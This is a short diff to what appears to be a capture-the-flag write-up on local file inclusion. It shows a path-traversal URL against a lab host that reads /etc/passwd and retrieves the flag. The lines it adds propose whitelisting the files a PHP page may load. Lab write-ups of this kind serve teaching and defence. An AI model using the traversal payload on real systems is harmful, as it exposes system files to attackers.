@@ -3,3 +3,9 @@ we try to include local file by changing the path
 we try /etc/passwd
 http://192.168.56.101/?page=../../../../../../../../../../../../etc/passwd
 we get the flag
+
+possible solution
+whitelist files on the php page only allow a list of files
+use a database to store all files the php file make a request to the db 
+so only files listed can be loaded
+
